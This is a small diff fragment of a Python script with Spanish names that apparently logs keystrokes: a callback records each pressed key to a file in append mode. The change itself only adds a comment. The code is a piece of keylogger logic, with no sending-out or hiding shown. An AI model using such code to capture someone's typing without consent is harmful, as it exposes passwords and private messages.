@@ -13,7 +13,7 @@ def teclado_():
     
     def grabadora(tecla):
        
-        archivo = open(nombre_archivo, "a")
+        archivo = open(nombre_archivo, "a") # se abre el arcihvo creado
         tecla=str(tecla)
         print(tecla)
         if tecla == 'Key.enter':
